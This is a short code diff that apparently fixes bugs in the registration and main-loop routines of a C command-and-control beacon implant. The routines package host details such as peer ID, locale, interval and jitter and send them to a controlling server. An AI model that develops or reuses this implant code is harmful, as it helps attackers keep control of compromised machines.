@@ -235,15 +235,17 @@ BOOL BeaconRegister
 	ElementList[15] = CreateVarIntElement(pBeacon->pGlobalConfig->uPeerID, 17);
 	ElementList[16] = CreateBytesElement(lpLocaleName, lstrlenA(lpLocaleName), 18);
 	
-	BeaconRegElements[0] = CreateBytesElement(pBeacon->szInstanceID, lstrlenA(pBeacon), 1);
+	BeaconRegElements[0] = CreateBytesElement(pBeacon->szInstanceID, lstrlenA(pBeacon->szInstanceID), 1);
 	BeaconRegElements[1] = CreateVarIntElement(pBeacon->dwInterval, 2);
 	BeaconRegElements[2] = CreateVarIntElement(pBeacon->dwJitter, 3);
 	BeaconRegElements[3] = CreateStructElement(ElementList, _countof(ElementList), 4);
 	BeaconRegElements[4] = CreateVarIntElement(GetNextCheckin(pBeacon), 5);
 
 	pFinalElement = CreateStructElement(BeaconRegElements, _countof(BeaconRegElements), 0);
+	SecureZeroMemory(&RegisterEnvelope, sizeof(RegisterEnvelope));
 	RegisterEnvelope.uType = MsgBeaconRegister;
 	RegisterEnvelope.pData = BufferMove(pFinalElement->pMarshalledData, pFinalElement->cbMarshalledData);
+	pFinalElement->pMarshalledData = NULL;
 	Result = pBeacon->Send(pBeacon->pGlobalConfig, pBeacon->lpClient, &RegisterEnvelope);
 CLEANUP:
 	if (lpHostName != NULL) {
@@ -425,6 +427,7 @@ VOID BeaconMainLoop
 	PBEACON_TASKS_WRAPPER pWrapper = NULL;
 	HANDLE hEvent = NULL;
 
+	hEvent = CreateEventA(NULL, TRUE, FALSE, NULL);
 	pBeacon->lpClient = pBeacon->Init();
 	if (pBeacon->lpClient == NULL) {
 		goto CLEANUP;
